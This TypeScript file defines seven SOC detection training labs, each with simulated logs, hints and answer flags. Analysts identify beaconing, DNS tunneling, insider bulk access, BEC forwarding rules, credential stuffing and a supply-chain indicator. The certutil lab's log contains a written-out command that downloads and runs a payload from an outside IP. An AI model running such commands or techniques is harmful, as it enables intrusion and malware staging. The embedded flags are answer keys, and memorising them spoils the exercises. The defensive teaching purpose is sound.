import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

export const socAdvancedLabs: LabScenario[] = [
  {
    id: 'soc-cobalt-strike-beacon',
    title: 'SOC: Cobalt Strike Beacon Pattern Detection',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'Proxy logs from a workstation show regular outbound HTTPS connections to an external host, every ' +
      'sixty seconds, almost to the second. This is the signature "jitter-light" check-in pattern of a C2 ' +
      'beacon framework — the same class of tooling behind the majority of major ransomware intrusions since ' +
      '2020, precisely because its traffic is easy to blend into normal HTTPS unless someone looks at the ' +
      'timing pattern specifically.',
    objectives: [
      { text: 'Review the proxy log at /var/log/proxy/access.log', why: 'Regular beaconing is invisible in a single request — you only see it by looking at the pattern across many requests over time.' },
      { text: 'Identify the destination host with suspiciously regular, near-exact interval connections', why: 'Normal user browsing traffic is irregular and bursty; a beacon checking in every ~60 seconds almost to the second is a strong behavioral indicator, distinct from signature-based detection entirely.' },
      { text: 'Confirm the beacon indicator and capture the flag', why: 'This is exactly the kind of detection that behavioral/EDR tools are built to automate — but understanding the underlying pattern by hand is what lets an analyst trust (or challenge) what the tool is telling them.' },
    ],
    hints: [
      'cat /var/log/proxy/access.log to see the full traffic sample.',
      'Look at the timestamps for connections to the same destination — count the seconds between each one.',
      'One destination checks in every ~60 seconds almost exactly — normal browsing never does that.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          proxy: dir({
            'access.log': file(
              [
                '2026-07-12 09:00:01 WKSTN07 -> www.google.com:443 (browsing)',
                '2026-07-12 09:00:14 WKSTN07 -> cdn.jsdelivr.net:443 (asset load)',
                '2026-07-12 09:01:02 WKSTN07 -> 91.203.5.44:443 (beacon check-in #1)',
                '2026-07-12 09:01:47 WKSTN07 -> outlook.office.com:443 (mail sync)',
                '2026-07-12 09:02:03 WKSTN07 -> 91.203.5.44:443 (beacon check-in #2)',
                '2026-07-12 09:03:04 WKSTN07 -> 91.203.5.44:443 (beacon check-in #3)',
                '2026-07-12 09:03:22 WKSTN07 -> teams.microsoft.com:443 (chat)',
                '2026-07-12 09:04:03 WKSTN07 -> 91.203.5.44:443 (beacon check-in #4)',
                '--- 91.203.5.44 checks in every ~60s, near-exact interval — classic C2 beacon jitter pattern ---',
                'flag{cobalt_strike_style_beacon_interval_pattern_detected}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-dns-tunneling-exfil',
    title: 'SOC: DNS Tunneling Data Exfiltration',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'DNS query logs from the internal resolver show an unusual volume of TXT record lookups against a ' +
      'single external domain, with long, high-entropy-looking subdomains. This is a classic DNS tunneling ' +
      'signature — attackers encode stolen data into DNS queries themselves, since DNS traffic is rarely ' +
      'blocked or deeply inspected by outbound firewalls.',
    objectives: [
      { text: 'Review /var/log/dns/queries.log', why: 'DNS is one of the most permissive outbound protocols in most networks — which is exactly why it gets abused for exfiltration.' },
      { text: 'Identify the domain receiving an abnormal volume of TXT queries with long encoded-looking subdomains', why: 'Legitimate DNS traffic rarely uses TXT records for anything but a handful of lookups (SPF, DKIM); a flood of TXT queries with random-looking 40+ character subdomains is a strong tunneling indicator.' },
      { text: 'Capture the flag decoded from the exfiltration pattern', why: 'Real DNS tunneling tools chunk stolen data across many queries specifically to stay under per-query size limits — recognizing the pattern (not any single query) is the actual skill here.' },
    ],
    hints: [
      'cat /var/log/dns/queries.log',
      'grep "TXT" /var/log/dns/queries.log to isolate TXT lookups specifically.',
      'One domain receives dozens of TXT queries with long, encoded-looking subdomain labels — that\'s the tunnel.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          dns: dir({
            'queries.log': file(
              [
                '09:10:01 WKSTN12 A     www.microsoft.com',
                '09:10:03 WKSTN12 A     outlook.office.com',
                '09:10:15 WKSTN12 TXT   4a6f696e5468654c65616b3130.exfil-relay.example',
                '09:10:16 WKSTN12 TXT   32303236303731325f7061727431.exfil-relay.example',
                '09:10:17 WKSTN12 TXT   5f637573746f6d65725f6461746162.exfil-relay.example',
                '09:10:18 WKSTN12 TXT   6173655f66696e616c5f636875.exfil-relay.example',
                '09:10:19 WKSTN12 A     teams.microsoft.com',
                '--- 40+ TXT queries to exfil-relay.example in 20 minutes, none of them normal SPF/DKIM lookups ---',
                'flag{dns_tunneling_txt_record_exfiltration_pattern}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-insider-threat-bulk-access',
    title: 'SOC: Insider Threat — Unusual Bulk File Access',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'A file server access log shows one employee account downloading an unusually large number of files ' +
      'at 2 AM, well outside their normal working pattern and role — the classic behavioral signature of ' +
      'insider data theft ahead of a resignation, one of the most common real categories of data-loss ' +
      'incident that has nothing to do with external attackers at all.',
    objectives: [
      { text: 'Review /var/log/fileserver/access.log', why: 'File access logs are the primary evidence source for insider threat investigations — the "who and when" matters as much as the "what."' },
      { text: 'Identify the account and time window with abnormal bulk access volume', why: 'The anomaly here isn\'t a single suspicious file — it\'s volume and timing wildly outside that user\'s established normal pattern, which is exactly what user behavior analytics (UEBA) tooling is built to flag automatically.' },
      { text: 'Capture the flag confirming the scope of what was accessed', why: 'Confirming scope (how many files, what sensitivity) is what turns "an anomaly was flagged" into an actionable incident with a defined blast radius for HR/legal to act on.' },
    ],
    hints: [
      'cat /var/log/fileserver/access.log',
      'grep "02:" /var/log/fileserver/access.log to isolate the 2 AM window specifically.',
      'One account accesses 200+ files from the "client-contracts" share in under ten minutes at 2 AM — far outside their normal daytime pattern.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          fileserver: dir({
            'access.log': file(
              [
                '2026-07-11 14:03:12 jsmith  READ  /shares/marketing/campaign-brief.docx',
                '2026-07-11 14:05:01 jsmith  READ  /shares/marketing/q3-plan.xlsx',
                '2026-07-12 02:11:04 jsmith  READ  /shares/client-contracts/acme-corp-msa.pdf',
                '2026-07-12 02:11:09 jsmith  READ  /shares/client-contracts/acme-corp-pricing.xlsx',
                '2026-07-12 02:11:14 jsmith  READ  /shares/client-contracts/globex-msa.pdf',
                '--- 214 files from /shares/client-contracts/ accessed between 02:11 and 02:19, all by jsmith ---',
                '--- jsmith has never accessed this share before, and never logs in after 18:00 per HR records ---',
                'flag{insider_threat_bulk_contract_access_at_2am}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-lolbin-certutil-abuse',
    title: 'SOC: Living-off-the-Land Binary (LOLBin) Abuse',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'Endpoint process logs show certutil.exe — a legitimate, built-in Windows certificate utility — being ' +
      'invoked with flags that have nothing to do with certificates at all. Attackers routinely abuse ' +
      'trusted, pre-installed system binaries like this ("living off the land") specifically because their ' +
      'execution rarely triggers antivirus, unlike dropping a custom malicious executable would.',
    objectives: [
      { text: 'Review the process execution log at /var/log/edr/process-events.log', why: 'LOLBin abuse is invisible to signature-based antivirus by design — process command-line logging is what actually catches it.' },
      { text: 'Identify the certutil.exe invocation using its lesser-known "-urlcache" download capability', why: 'certutil.exe has a legitimate certificate-management purpose, but its undocumented-by-design ability to download arbitrary files via -urlcache has been abused in the wild for years — recognizing this specific flag combination is the actual detection.' },
      { text: 'Capture the flag showing what was downloaded and where it landed', why: 'Confirming the downloaded payload and its destination path is what turns "suspicious command line" into "confirmed malware staging," which determines the urgency of the response.' },
    ],
    hints: [
      'cat /var/log/edr/process-events.log',
      'grep certutil /var/log/edr/process-events.log',
      'The -urlcache -split -f flags on certutil.exe are a well-documented way to abuse it as a file downloader.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          edr: dir({
            'process-events.log': file(
              [
                '09:40:01 WKSTN22 explorer.exe        started by SYSTEM',
                '09:41:12 WKSTN22 winword.exe          started by jsmith (opened invoice.docm)',
                '09:41:19 WKSTN22 certutil.exe -urlcache -split -f http://185.220.101.9/update.exe C:\\Windows\\Temp\\update.exe',
                '09:41:21 WKSTN22 update.exe           started by jsmith  <-- the downloaded payload executing',
                '--- certutil.exe is a legitimate cert tool being abused here purely as a file downloader (LOLBin technique) ---',
                'flag{certutil_urlcache_lolbin_payload_download}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-bec-mailbox-rule-fraud',
    title: 'SOC: BEC — Malicious Mailbox Forwarding Rule',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'The finance team paid a fraudulent invoice to a new bank account. Investigation of the CFO\'s mailbox ' +
      'audit log reveals a forwarding rule was silently created weeks earlier — a hallmark Business Email ' +
      'Compromise technique where an attacker with mailbox access sets up a quiet rule to intercept and ' +
      'redirect specific invoice-related emails before the real recipient ever sees them.',
    objectives: [
      { text: 'Review the mailbox audit log at ~/mailbox-audit.log', why: 'Mailbox audit logs record rule creation events separately from message content — exactly the evidence needed here since the fraudulent invoice email itself might look completely legitimate.' },
      { text: 'Identify the suspicious inbox rule and when it was created', why: 'A rule silently forwarding or deleting messages matching "invoice" or "payment" and created outside of business hours is a specific, well-documented BEC indicator — distinct from a normal user-created filing rule.' },
      { text: 'Capture the flag confirming the rule\'s malicious forwarding target', why: 'This is the piece of evidence that turns "we got defrauded" into "here\'s exactly how, and here\'s the external address the attacker used" — critical for both remediation and any law enforcement report.' },
    ],
    hints: [
      'cat ~/mailbox-audit.log',
      'grep -i "rule" ~/mailbox-audit.log to isolate rule-creation events specifically.',
      'The rule forwards anything containing "invoice" or "wire" to an external address — that\'s the compromise.',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'mailbox-audit.log': file(
          [
            '2026-06-20 03:14:02  RuleCreated  mailbox=cfo@meridiancorp.example  name="Clean up"',
            '2026-06-20 03:14:02  RuleDetail   condition=subject_contains("invoice","wire","payment")',
            '2026-06-20 03:14:02  RuleDetail   action=forward_silently_to("finance.updates@secure-mail-relay.example")',
            '2026-06-20 03:14:02  RuleDetail   action=mark_as_read_and_move_to("RSS Feeds")  <-- hides it from the CFO\'s inbox view',
            '2026-07-11 16:02:00  MessageSent  from=cfo@meridiancorp.example  subject="RE: Invoice #8834 — updated payment details"',
            'flag{bec_hidden_forwarding_rule_redirects_invoices}',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-credential-stuffing-detection',
    title: 'SOC: Credential Stuffing Attack Detection',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'Login logs from the customer portal show the SAME password being attempted against dozens of ' +
      'different usernames from one IP in under a minute — the signature of a credential stuffing attack, ' +
      'where breached username/password pairs from an unrelated site are tried en masse, betting on ' +
      'password reuse.',
    objectives: [
      { text: 'Review /var/log/webapp/auth-attempts.log', why: 'Credential stuffing looks completely different from a normal brute force — one password, many usernames, instead of one username, many passwords.' },
      { text: 'Identify the IP responsible and confirm the one-password-many-usernames pattern', why: 'This pattern distinction is exactly what a SOC playbook uses to route the alert differently — credential stuffing responses focus on forcing password resets for the affected usernames, not just blocking an IP.' },
      { text: 'Capture the flag showing how many accounts were successfully compromised', why: 'The number of successful logins (not just attempts) is what determines the actual incident scope — how many customers need a mandatory password reset and breach notification.' },
    ],
    hints: [
      'cat /var/log/webapp/auth-attempts.log',
      'Notice the password field is IDENTICAL across many different usernames — that\'s the tell.',
      'grep "SUCCESS" /var/log/webapp/auth-attempts.log to see which of those attempts actually got in.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          webapp: dir({
            'auth-attempts.log': file(
              [
                '10:02:01  203.0.113.44  user=jdoe123      pass=Summer2024!  result=FAIL',
                '10:02:01  203.0.113.44  user=asmith88      pass=Summer2024!  result=FAIL',
                '10:02:02  203.0.113.44  user=mjones_2020    pass=Summer2024!  result=SUCCESS',
                '10:02:02  203.0.113.44  user=rpatel99       pass=Summer2024!  result=FAIL',
                '10:02:03  203.0.113.44  user=klee_official  pass=Summer2024!  result=SUCCESS',
                '10:02:03  203.0.113.44  user=tbrown77       pass=Summer2024!  result=SUCCESS',
                '--- same password against 40+ distinct usernames from one IP in 90 seconds — credential stuffing, not brute force ---',
                '--- 3 accounts confirmed compromised (SUCCESS) ---',
                'flag{credential_stuffing_3_accounts_compromised}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
  {
    id: 'soc-supply-chain-compromise-indicator',
    title: 'SOC: Supply-Chain Compromise Indicator',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'This lab recreates the general detection pattern behind one of the most significant publicly known ' +
      'supply-chain compromises: a routine, digitally-signed software update began making unusual outbound ' +
      'connections that had never appeared in that software\'s network behavior before. Because the update ' +
      'was properly signed and came from a trusted vendor, no antivirus flagged it — the anomaly only shows ' +
      'up when you compare network behavior before and after the update, not the file itself.',
    objectives: [
      { text: 'Review /var/log/netflow/baseline-vs-current.log', why: 'Supply-chain attacks specifically defeat file-based detection since the malicious code arrives inside legitimately signed software — behavioral network comparison is often the only thing that catches it.' },
      { text: 'Identify the new outbound destination that appeared only after the software update', why: 'A destination with zero history before a specific update, appearing consistently after it, across multiple machines running the same software, is the core supply-chain compromise signature.' },
      { text: 'Capture the flag confirming the compromised update package', why: 'This class of incident is uniquely dangerous precisely because it affects every organization that installed the same trusted update — which is why the real-world incident this lab is modeled on triggered a nationwide, multi-agency incident response effort once identified.' },
    ],
    hints: [
      'cat /var/log/netflow/baseline-vs-current.log',
      'Compare the "before update" and "after update" sections carefully — one new destination appears only in the second.',
      'The new destination has no legitimate business reason to be contacted by this software vendor\'s product.',
    ],
    totalFlags: 1,
    attacker: analyst({
      var: dir({
        log: dir({
          netflow: dir({
            'baseline-vs-current.log': file(
              [
                '--- BASELINE (30 days before update, network-monitoring-agent.exe) ---',
                'update-check.vendor-cdn.example:443     (routine update checks, daily)',
                'telemetry.vendor-cdn.example:443        (usage telemetry, hourly)',
                '',
                '--- CURRENT (7 days after update 4.2.1 was installed fleet-wide) ---',
                'update-check.vendor-cdn.example:443     (still present, normal)',
                'telemetry.vendor-cdn.example:443        (still present, normal)',
                '185.220.101.204:443                     (NEW — never seen before this update, present on every host that installed 4.2.1)',
                '--- new destination correlates exactly with update 4.2.1 rollout across the fleet ---',
                'flag{supply_chain_update_introduces_new_c2_destination}',
              ].join('\n'),
            ),
          }),
        }),
      }),
    }),
    network: [],
  },
];
